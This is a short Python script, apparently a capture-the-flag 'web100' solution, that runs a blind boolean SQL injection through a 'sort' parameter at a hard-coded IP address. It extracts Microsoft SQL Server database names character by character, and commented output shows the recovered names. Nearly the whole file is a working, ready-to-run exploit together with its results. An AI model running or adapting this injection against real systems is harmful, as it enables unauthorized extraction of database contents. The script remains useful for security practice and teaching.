import time
import requests
import string

# proxyDict = {"http":"http://127.0.0.1:8080"}

#Get length db_name()
def database_len(i):
	flag = True
	j = 0
	while flag == True:
		url = "http://167.172.85.253/web100/?sort=(SELECT+(CASE+WHEN+(1=2)+THEN+'name'+ELSE+(SELECT+len(db_name({}))+UNION+SELECT+{})+END))".format(i, j)
		# response = requests.get(url, proxies=proxyDict)
		response = requests.get(url)
		if "Error" not in response.text:
			flag = False
			break
		j = j + 1			
	return j		
			
#Bruteforce 10 db_name()			
def database_name():
	print('Brute force Database name...')
	for dlen in range(0,10):
		length = database_len(dlen)
		text = "db_name({}): {}".format(dlen, length)
		print(text)
		i = 1
		name = ""
		while i < length:
			for j in string.printable:
				url = "http://167.172.85.253/web100/?sort=(SELECT+(CASE+WHEN+(1=2)+THEN+'name'+ELSE+(SELECT+ascii(substring(db_name({}),{},1))+UNION+SELECT+ascii('{}'))+END))".format(dlen, i, j)
				# response = requests.get(url, proxies=proxyDict)
				response = requests.get(url)
				if "Error" not in response.text:
					name = name + j
					i = i + 1
					print(name)
					break	
		print("Database name is:", name)

def main():
    database_name()

if __name__ == '__main__':
    	main()


# Brute force Database name...
# db_name(0): 22
# s
# ss
# ssa
# ssal
# ssalc
# ssalch
# ssalcht
# ssalchti
# ssalchtiw
# ssalchtiwe
# ssalchtiwes
# ssalchtiwesm
# ssalchtiwesmi
# ssalchtiwesmih
# ssalchtiwesmihc
# ssalchtiwesmihcu
# ssalchtiwesmihcue
# ssalchtiwesmihcuey
# ssalchtiwesmihcueym
# ssalchtiwesmihcueymo
# ssalchtiwesmihcueymor
# Database name is: ssalchtiwesmihcueymor
# db_name(1): 6
# m
# ma
# mas
# mast
# maste
# Database name is: maste
# db_name(2): 6
# t
# te
# tem
# temp
# tempd
# Database name is: tempd
# db_name(3): 5
# m
# mo
# mod
# mode
# Database name is: mode
# db_name(4): 4
# m
# ms
# msd
# Database name is: msd